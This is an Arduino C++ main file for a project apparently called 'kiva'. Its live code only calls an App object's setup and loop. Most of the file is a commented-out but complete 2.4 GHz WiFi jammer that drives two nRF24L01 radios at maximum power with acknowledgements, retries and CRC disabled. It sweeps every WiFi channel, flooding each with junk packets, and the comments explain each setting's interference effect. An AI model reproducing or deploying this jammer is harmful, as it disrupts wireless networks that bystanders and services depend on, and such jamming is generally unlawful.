#include <Arduino.h>
#include "App.h"

App kivaApp;

void setup() {
  kivaApp.setup();
}

void loop() {
  kivaApp.loop();
}


// #include <SPI.h>
// #include <RF24.h>

// // --- Pin Definitions for your two nRF24L01 modules ---
// const uint8_t NRF1_CE_PIN = 1;
// const uint8_t NRF1_CSN_PIN = 2;
// const uint8_t NRF2_CE_PIN = 43;
// const uint8_t NRF2_CSN_PIN = 44;

// // --- Radio Objects ---
// // The constructor takes (CE_PIN, CSN_PIN)
// RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN, 16000000);
// RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN, 16000000);

// // --- Jamming Payload ---
// // The content doesn't matter; it's just junk data to transmit.
// const char jam_text[] = "xxxxxxxxxxxxxxxx";

// // Helper function to initialize a radio module for jamming
// void initialize_radio(RF24& radio, const char* radioName) {
//   Serial.print("Initializing ");
//   Serial.println(radioName);

//   if (!radio.begin()) {
//     Serial.print(radioName);
//     Serial.println(" is not responding. Check your wiring.");
//     while (1) {} // Halt if the module isn't connected
//   }

//   // --- Configure for maximum interference ---
//   radio.setAutoAck(false);             // Disable automatic acknowledgment
//   radio.stopListening();               // Set as a transmitter
//   radio.setRetries(0, 0);                // No retries on failure
//   radio.setPALevel(RF24_PA_MAX);       // Set power amplifier to maximum
//   radio.setDataRate(RF24_2MBPS);       // Use the highest data rate
//   radio.setCRCLength(RF24_CRC_DISABLED); // Disable CRC for faster packet transmission
  
//   Serial.print(radioName);
//   Serial.println(" initialized successfully.");
// }

// void setup() {
//   Serial.begin(115200);
//   Serial.println("Starting WiFi Jammer...");

//   // Since both modules share the same SPI bus, we only need to initialize it once.
//   SPI.begin();

//   // Initialize both radio modules with jamming settings
//   initialize_radio(radio1, "Radio 1");
//   initialize_radio(radio2, "Radio 2");

//   Serial.println("\n--- Jamming Started ---");
//   Serial.println("This will now loop forever, jamming all WiFi channels.");
// }

// void loop() {
//   // This logic is taken directly from the original `wifi_jam` function.
//   // It cycles through all 13 standard 2.4GHz WiFi channels.
  
//   for (int channel = 0; channel < 13; channel++) {
//     // For each broad WiFi channel, this inner loop sweeps across its specific frequency band.
//     // The nRF24L01 has narrow channels (1MHz), while WiFi has wide ones (~22MHz).
//     // This loop transmits on multiple adjacent nRF channels to cover one WiFi channel.
//     for (int i = (channel * 5) + 1; i < (channel * 5) + 23; i++) {
      
//       // Set the channels for the two modules.
//       radio1.setChannel(i);
      
//       // The second radio sweeps from the opposite end of the spectrum (83-i).
//       // This allows both modules to cover the entire band more quickly and effectively.
//       radio2.setChannel(83 - i); 

//       // Transmit the junk data payload. The content doesn't matter,
//       // only the radio frequency energy being broadcasted.
//       // writeFast doesn't wait for an acknowledgement, making it ideal for flooding.
//       radio1.writeFast(&jam_text, sizeof(jam_text));
//       radio2.writeFast(&jam_text, sizeof(jam_text));
//     }
//   }
// }